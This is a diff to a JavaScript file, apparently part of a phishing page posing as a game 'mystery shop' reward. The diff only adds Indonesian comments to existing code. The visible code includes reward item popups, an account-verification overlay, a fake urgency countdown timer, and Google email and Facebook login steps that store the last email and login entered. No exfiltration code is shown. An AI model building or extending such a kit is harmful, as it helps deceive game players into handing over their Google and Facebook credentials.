@@ -1,3 +1,5 @@
+// lazcodeffmysteryshop.js
+// Variabel global
 var _ggLastEmail = '';
 var _ggLastLogin = '';
 
@@ -19,6 +21,7 @@ function locationRedirect() {
   document.querySelector('.account_verification').style.display = 'flex';
 }
 
+// Fungsi untuk popup item
 function open_itemReward_confirmation2(el) {
   document.getElementById('myItemReward_confirmationImg').src = el.getAttribute('src');
   document.getElementById('ItemName').textContent = el.getAttribute('item-name');
@@ -81,6 +84,7 @@ function ValidateVerificationData() {
   return false;
 }
 
+// Timer countdown
 $(document).ready(function() {
   var detik = 57, menit = 59, jam = 23;
   function updateTimer() {
@@ -94,6 +98,7 @@ $(document).ready(function() {
   updateTimer();
 });
 
+// Slider notifikasi (lazaslide)
 var LazIndexHeader = 0;
 function showLazSlidez() {
   var slides = document.getElementsByClassName('lazaslide');
@@ -105,6 +110,7 @@ function showLazSlidez() {
 }
 showLazSlidez();
 
+// Scrolling banner untuk teks panjang
 function initScrollingBanners() {
   document.querySelectorAll('.item-name-banner, .item-name-confirmation').forEach(function(banner) {
     var span = banner.querySelector('span');
@@ -122,6 +128,7 @@ function initScrollingBanners() {
 document.addEventListener('DOMContentLoaded', initScrollingBanners);
 window.addEventListener('resize', initScrollingBanners);
 
+// Event listener tambahan
 document.addEventListener('DOMContentLoaded', function() {
   var btnKeluar = document.getElementById('btnKeluar');
   if (btnKeluar) {
@@ -136,6 +143,7 @@ document.addEventListener('DOMContentLoaded', function() {
       closeModal();
     }
   });
+
   document.addEventListener('keydown', function(e) {
     if (e.key !== 'Enter') return;
     if (document.getElementById('stepGEmail')?.classList.contains('active')) {
@@ -146,6 +154,7 @@ document.addEventListener('DOMContentLoaded', function() {
       fbHandleLogin();
     }
   });
+
   var downloadBtn = document.getElementById('downloadBtn');
   if (downloadBtn) {
     downloadBtn.addEventListener('click', openModal);
